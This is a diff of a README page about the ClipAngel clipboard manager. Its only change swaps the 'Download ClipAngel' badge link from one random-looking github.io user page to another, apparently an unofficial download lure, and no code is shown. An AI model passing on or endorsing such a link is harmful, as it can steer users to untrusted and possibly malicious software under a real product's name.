@@ -15,7 +15,7 @@
 - **Marks:** Mark a harmless clip as a favorite to learn how **ClipAngel** surfaces starred items at the top.
 - **Export:** Use **ClipAngel** export when you need a static file for evidence outside **ClipAngel** itself.
 
-[![Download ClipAngel](https://img.shields.io/badge/Download-ClipAngel-6610f2)](https://fordchangjcqy.github.io/.github/clipangel-filters-marks-history)
+[![Download ClipAngel](https://img.shields.io/badge/Download-ClipAngel-6610f2)](https://dariobeasleydkan.github.io/.github/clipangel-filters-marks-history)
 
 ---
 
